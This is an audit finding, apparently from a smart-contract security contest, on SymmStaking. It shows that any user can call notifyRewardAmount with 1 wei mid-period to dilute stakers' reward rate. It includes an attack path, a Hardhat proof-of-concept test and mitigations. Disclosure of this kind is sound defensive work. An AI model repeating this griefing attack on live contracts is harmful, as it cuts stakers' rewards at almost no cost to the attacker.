# Any user can grief reward rates by adding minimal rewards

### Summary

The lack of check for the new reward rate to be more than the old rate in _addRewardsForToken will cause significant reward rate reduction for stakers as malicious users can add tiny reward amounts to dilute the reward rate calculation.

### Root Cause

In the function [__addRewardsForToken](https://github.com/sherlock-audit/2025-03-symm-io-stacking/blob/d7cf7fc96af1c25b53a7b500a98b411cd018c0d3/token/contracts/staking/SymmStaking.sol#L366-L379), the reward rate recalculation doesn't validate that the new rate is bigger than the old rate, allowing tiny amounts to drastically reduce the rate when added mid-period.

### Internal Pre-conditions

1. Someone needs to have configured a reward token and notified initial rewards
2. At least one user needs to be staking tokens
3. Current reward period needs to be ongoing (block.timestamp < periodFinish)

### Attack Path

1. Attacker waits some time to pass of the reward period
2. Attacker calls `notifyRewardAmount` with 1 wei
3. The reward rate is recalculated using: `(1 wei + remaining_rewards) / 7 days (in seconds)`
4. This drastically reduces the reward rate for the new period

### Impact

 Stakers suffer significant reduction in expected rewards. The attacker only loses 1 wei of reward tokens to execute the grief. Moreover, whenever the griefer repeats the attack permanently, the rewards rate will be dilluted indefinitely, DOSing the rewards forever

### PoC

Add this test to symmStaking.behavior.ts.

```javascript
		it("griefing rewards rates", async function () {
			// Scenario: Single depositor â€” user1 deposits 604,800 SYMM.

			const USDCDeposit = "99792000"		// 99,79 USD (165 USDC tokens per second)
			const depositAmount = "604800"		// 604800 SYM
			await usdcToken.connect(admin).approve(await symmStaking.getAddress(), USDCDeposit)
			await symmStaking.connect(admin).configureRewardToken(await usdcToken.getAddress(), true)
			await symmStaking.connect(admin).notifyRewardAmount([await usdcToken.getAddress()], [USDCDeposit])

			//

			await stakingToken.connect(user1).approve(await symmStaking.getAddress(), depositAmount)
			await symmStaking.connect(user1).deposit(depositAmount, user1.address)


			await time.increase(302400)

			// after half of the time -> 3,5 days, the user claims USDC, he should get 49896000 (with a little bit difference due to rounding)

			const user1USDCFirstBalanceBefore = await usdcToken.balanceOf(user1.address)
			await symmStaking.connect(user1).claimRewards()
			const user1USDCFirstBalanceAfter = await usdcToken.balanceOf(user1.address)
			const firstClaim = user1USDCFirstBalanceAfter - user1USDCFirstBalanceBefore

			console.log("first claim:", firstClaim)


			const griefAmount = "1"

			// transfering 1 USDC from the admin to user2 (instead of minting)
			await usdcToken.connect(admin).transfer(user2.address, griefAmount)

			// user 2 griefs the rate by calling notifyRewardAmount with 1 amount

			await usdcToken.connect(user2).approve(await symmStaking.getAddress(), griefAmount)
			await symmStaking.connect(user2).notifyRewardAmount([await usdcToken.getAddress()], [griefAmount])


			await time.increase(302400)

			const griefedUser1BalanceBefore = await usdcToken.balanceOf(user1.address)
			await symmStaking.connect(user1).claimRewards()
			const griefedUser1BalanceAfter = await usdcToken.balanceOf(user1.address)

			const secondClaim = griefedUser1BalanceAfter - griefedUser1BalanceBefore
			console.log("second claim:", secondClaim)

			console.log("difference between claims", (firstClaim - secondClaim))

			// user2 could grief reward rate infinitely
```


### Mitigation

1. Ensure new rate is higher or equal to the current rate
2. Only allow authorized roles (like REWARD_MANAGER_ROLE) to call `notifyRewardAmount`
